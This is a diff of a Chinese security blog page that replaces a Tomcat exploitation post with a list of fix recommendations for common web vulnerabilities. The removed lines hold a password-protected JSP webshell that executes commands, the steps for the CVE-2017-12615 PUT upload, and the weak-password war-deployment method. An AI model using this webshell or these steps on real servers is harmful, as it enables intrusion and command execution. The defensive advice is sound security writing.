@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="漏洞复现," />
+  <meta name="keywords" content="业务安全," />
 
 
 
@@ -86,25 +86,18 @@
 
 
 
-<meta name="description" content="cve-2017-12615、tomcat管理后台getshell">
-<meta name="keywords" content="漏洞复现">
+<meta name="description" content="SQL、XSS、CSRF、文件包含上传、逻辑漏洞...">
+<meta name="keywords" content="业务安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Tomcat">
-<meta property="og:url" content="http://yoursite.com/2018/07/31/Tomcat/index.html">
+<meta property="og:title" content="漏洞修复建议集合">
+<meta property="og:url" content="http://yoursite.com/2018/09/01/漏洞修复建议集合/index.html">
 <meta property="og:site_name" content="BEHIND THE GROWTH">
-<meta property="og:description" content="cve-2017-12615、tomcat管理后台getshell">
+<meta property="og:description" content="SQL、XSS、CSRF、文件包含上传、逻辑漏洞...">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/put1.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/shell.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/tomcatManager.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/manager.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/war.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/31/Tomcat/shell2.png">
-<meta property="og:updated_time" content="2018-08-19T07:50:25.449Z">
+<meta property="og:updated_time" content="2018-09-02T16:12:55.457Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Tomcat">
-<meta name="twitter:description" content="cve-2017-12615、tomcat管理后台getshell">
-<meta name="twitter:image" content="http://yoursite.com/2018/07/31/Tomcat/put1.png">
+<meta name="twitter:title" content="漏洞修复建议集合">
+<meta name="twitter:description" content="SQL、XSS、CSRF、文件包含上传、逻辑漏洞...">
 
 
 
@@ -134,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/07/31/Tomcat/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/09/01/漏洞修复建议集合/"/>
 
 
 
 
 
-  <title>Tomcat | BEHIND THE GROWTH</title>
+  <title>漏洞修复建议集合 | BEHIND THE GROWTH</title>
   
 
 
@@ -267,7 +260,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/31/Tomcat/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/01/漏洞修复建议集合/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="WyyFree">
@@ -284,7 +277,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Tomcat</h1>
+          <h1 class="post-title" itemprop="name headline">漏洞修复建议集合</h1>
         
 
         <div class="post-meta">
@@ -296,8 +289,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-31T16:24:00+08:00">
-                2018-07-31
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-01T22:47:00+08:00">
+                2018-09-01
               </time>
             
 
@@ -343,7 +336,7 @@
 
           
               <div class="post-description">
-                  cve-2017-12615、tomcat管理后台getshell
+                  SQL、XSS、CSRF、文件包含上传、逻辑漏洞...
               </div>
           
 
@@ -360,60 +353,61 @@
       
 
       
-        <p><hr></p>
-<center>
-
-<h2 id="CVE-2017-12615"><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h2><p></p></center><p></p>
-<ul>
-<li>原理</li>
+        <h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><ul>
+<li>使用参数检查的方式，拦截带有SQL语法的参数传入应用程序。</li>
+<li>解决SQL注入漏洞的关键是对所有来自用户输入的数据进行严格检查、对数据库配置使用最小权限原则</li>
+<li>使用预编译的处理方式处理拼接了用户参数的SQL语句。 </li>
+<li>在参数即将进入数据库执行之前，对SQL语句的语义进行完整性检查，确认语义没有发生变化。 </li>
+<li>在出现SQL注入漏洞时，要在出现问题的参数拼接进SQL语句前进行过滤或者校验，不要依赖程序最开始处防护代码。 </li>
+<li>对于sql注入参数检查，可以采取以下方案:<br>定期审计数据库执行日志，查看是否存在应用程序正常逻辑之外的SQL语句执行。</li>
 </ul>
-<p>Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件(PUT)<br>Tomcat版本：8.5.19</p>
-<pre><code>&lt;servlet&gt;
-    &lt;servlet-name&gt;default&lt;/servlet-name&gt;
-    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;debug&lt;/param-name&gt;
-        &lt;param-value&gt;0&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;listings&lt;/param-name&gt;
-        &lt;param-value&gt;false&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;readonly&lt;/param-name&gt;
-        &lt;param-value&gt;false&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
-&lt;/servlet&gt;
-</code></pre><ul>
-<li>复现</li>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><ul>
+<li>将重要的cookie标记为http only，使JavaScript中的document.cookie语句不能获取到cookie。 </li>
+<li>输入检查：只允许指定标签使用 </li>
+<li>输出检查：对数据进行Html Encode处理，过滤或移除特殊的Html标签，例如：<code>&lt;script&gt;, &lt;iframe\&gt; , &lt; for &lt;, &gt; for &gt;, &amp;quot for，过滤JavaScript事件的标签。例如 &quot;onclick=&quot;, &quot;onfocus&quot; 等等。</code></li>
+<li>其他参考：富文本过滤库<br>ruby: <a href="https://github.com/rgrove/sanitize" target="_blank" rel="noopener">https://github.com/rgrove/sanitize</a><br>php: <a href="https://github.com/ezyang/htmlpurifier" target="_blank" rel="noopener">https://github.com/ezyang/htmlpurifier</a><br>javascript: <a href="https://github.com/leizongmin/js-xss" target="_blank" rel="noopener">https://github.com/leizongmin/js-xss</a><br><a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener">https://github.com/cure53/DOMPurify</a></li>
 </ul>
-<p>虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用<code>/</code>）来绕过了限制。<br>jsbWebshell</p>
-<pre><code>&lt;%
-    if(&quot;0617&quot;.equals(request.getParameter(&quot;pwd&quot;))){
-        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();
-        int a = -1;
-        byte[] b = new byte[2048];
-        out.print(&quot;&lt;pre&gt;&quot;);
-        while((a=in.read(b))!=-1){
-            out.println(new String(b));
-        }
-        out.print(&quot;&lt;/pre&gt;&quot;);
-    }
-%&gt;
-</code></pre><p><img src="/2018/07/31/Tomcat/put1.png" alt="PUT"><br>访问上传的后门<br><img src="/2018/07/31/Tomcat/shell.png" alt="shell"></p>
-<p><hr></p>
-<center>
-
-<h2 id="Tomcat后台弱口令-amp-amp-后台getshell"><a href="#Tomcat后台弱口令-amp-amp-后台getshell" class="headerlink" title="Tomcat后台弱口令 &amp;&amp; 后台getshell"></a>Tomcat后台弱口令 &amp;&amp; 后台getshell</h2><p></p></center><p></p>
-<ul>
-<li>后台弱口令</li>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><ul>
+<li>添加验证码：在用户提交数据之前，让用户输入验证码，或者用户在进行关键操作时，让用户重新输入密码进行验证。 </li>
+<li>验证HTTP Referer字段：在通常情况下，访问一个安全受限页面的请求来自于同一个网站， HTTP 头中的Referer字段记录了该 HTTP 请求的来源地址，如果Referer中的地址不是来源于本网站则可认为是不安全的请求，对于该请求应予以拒绝。 这种方法简单易行，对于现有的系统只需在加上一个检查Referer值的过滤器，无需改变当前系统的任何已有代码和逻辑。 但是，这种方法存在一些问题需要考虑：首先，Referer 的值是由浏览器提供的，虽然HTTP协议上有明确的要求，但是每个浏览器对于Referer的具体实现可能有差别，并且不能保证浏览器自身没有安全漏洞，将安全性交给第三方（即浏览器）保证，从理论上来讲是不可靠的；其次，用户可能会出于保护隐私等原因禁止浏览器提供Referer，这样的话正常的用户请求也可能因没有Referer信息被误判为不不安全的请求，无法提供正常的使用。 </li>
+<li>使用token：业界一致的做法是使用一个token。CSRF攻击之所以能够成功是因为攻击者可以伪造用户的请求，对此最好的防御手段就是让攻击者无法伪造这个请求。因此，我们可以在HTTP请求中以参数的形式添加一个随机的token，并在服务器端检查这个token是否正确，如不正确或不存在 ，则可以认为是不安全的请求，拒绝提供相关服务。<br>注意：如果网站同时还存在XSS漏洞时，上述token的方法将可能失效，因为XSS可以模拟浏览器执行操作，攻击者通过XSS漏洞读取token值后，便可以构造出合法的用户请求了。所以在做好CSRF防护的同时，相应的安全防护也应做好。</li>
 </ul>
-<p>Tomcat后台：<a href="http://ip:8080/manager/html" target="_blank" rel="noopener">http://ip:8080/manager/html</a><br>弱口令：tomcat/tomcat<br>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。<br>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。<br><img src="/2018/07/31/Tomcat/tomcatManager.png" alt="conf"></p>
-<ul>
-<li>后台上传war getshell</li>
+<h2 id="文件遍历-下载"><a href="#文件遍历-下载" class="headerlink" title="文件遍历/下载"></a>文件遍历/下载</h2><ul>
+<li>开发自行处理URL不当引入，则可过滤self.path，递归地过滤掉”..”或者是当发现URL中存在”..”，直接响应403。 </li>
+<li>对网站用户提交过来的文件名进行硬编码或者统一编码，对文件后缀进行白名单控制，对包含了恶意的符号或者空字节进行拒绝。</li>
 </ul>
-<p>1、制作war包<br>将1.jsp压缩成zip格式，将zip重命名为war -&gt; 1.war<br>2、后台上传<br><img src="/2018/07/31/Tomcat/manager.png" alt="manager"><br><img src="/2018/07/31/Tomcat/war.png" alt="war"><br>3、访问1.jsp<br><img src="/2018/07/31/Tomcat/shell2.png" alt="shell"></p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ul>
+<li>后端控制上传文件类型，处理时强制生成文件名。 </li>
+<li>上传的目录不进行解析，只提供下载权限。  </li>
+<li>开源编辑器上传漏洞：若新版编辑器已修复漏洞，请更新编辑器版本。 </li>
+<li>在服务器后端对上传的文件进行过滤。 </li>
+<li>建议使用白名单的方法对文件进行过滤。 </li>
+<li>使用随机数改写文件名和文件路径,不要使用用户定义的文件名和文件路径。 </li>
+<li>除了以上的方法之外，还可将被上传的文件限制在某一路径下，并在文件上传目录禁止脚本解析。</li>
+</ul>
+<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><ul>
+<li>使用安全配置，对敏感服务接口使用白名单访问控制列表。</li>
+<li>验证一切来自客户端的参数，重点是和权限相关的参数，比如用户ID或者角色权限ID等。</li>
+<li>session ID 和认证的token做绑定，放在服务器的会话里，不发送给客户端。 </li>
+<li>对于用户登录后涉及用户唯一信息的请求，每次都要验证检查所有权，敏感信息页面加随机数的参数，防止浏览器缓存内容。 </li>
+<li>把程序分成匿名，授权和管理的区域，通过将角色和数据功能匹配。 </li>
+<li>不使用参数来区分管理员和普通用户。</li>
+</ul>
+<h2 id="业务逻辑缺陷"><a href="#业务逻辑缺陷" class="headerlink" title="业务逻辑缺陷"></a>业务逻辑缺陷</h2><ul>
+<li>业务逻辑需要严谨控制，对敏感业务操作需要校验身份信息，修改操作需要二次验证, session ID 和认证的token做绑定，放在服务器的会话里，不发送给客户端。</li>
+<li>对数据操作时需要加锁。</li>
+<li>权限控制要设计好，避免操作越权出现。</li>
+<li>减少前端验证</li>
+</ul>
+<h2 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="信息泄漏"></a>信息泄漏</h2><ul>
+<li>后端控制严谨，用*号来隐藏敏感信息展现。 </li>
+<li>密码策略要足够复杂，开启二步验证。 </li>
+<li>服务配置严谨，对测试和生产资源做好访问控制。 </li>
+</ul>
+<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><ul>
+<li>减少可利用的判断信息，对提示语句内容进行模糊描述(帐号或密码错误，登录失败…)</li>
+<li>限制用户短时间内重复提交验证码，例如一分钟只能提交三次，该操作应该在后端进行控制而不是用前端控制</li>
+</ul>
 
       
     </div>
@@ -431,7 +425,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/漏洞复现/" <i class="fa fa-tag"></i> 漏洞复现</a>
+            <a href="/tags/业务安全/" <i class="fa fa-tag"></i> 业务安全</a>
           
         </div>
       
@@ -444,8 +438,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/07/29/日志分析/" rel="next" title="日志分析">
-                <i class="fa fa-chevron-left"></i> 日志分析
+              <a href="/2018/08/12/Burpsuite使用/" rel="next" title="Burpsuite使用">
+                <i class="fa fa-chevron-left"></i> Burpsuite使用
               </a>
             
           </div>
@@ -453,10 +447,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/08/02/redis未授权访问/" rel="prev" title="Redis未授权访问">
-                Redis未授权访问 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -592,7 +582,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-12615"><span class="nav-number">1.</span> <span class="nav-text">CVE-2017-12615</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat后台弱口令-amp-amp-后台getshell"><span class="nav-number">2.</span> <span class="nav-text">Tomcat后台弱口令 &amp;&amp; 后台getshell</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL"><span class="nav-number">1.</span> <span class="nav-text">SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-number">2.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-number">3.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件遍历-下载"><span class="nav-number">4.</span> <span class="nav-text">文件遍历/下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件上传"><span class="nav-number">5.</span> <span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#越权"><span class="nav-number">6.</span> <span class="nav-text">越权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#业务逻辑缺陷"><span class="nav-number">7.</span> <span class="nav-text">业务逻辑缺陷</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息泄漏"><span class="nav-number">8.</span> <span class="nav-text">信息泄漏</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#暴力破解"><span class="nav-number">9.</span> <span class="nav-text">暴力破解</span></a></li></ol></div>
             
 
           </div>
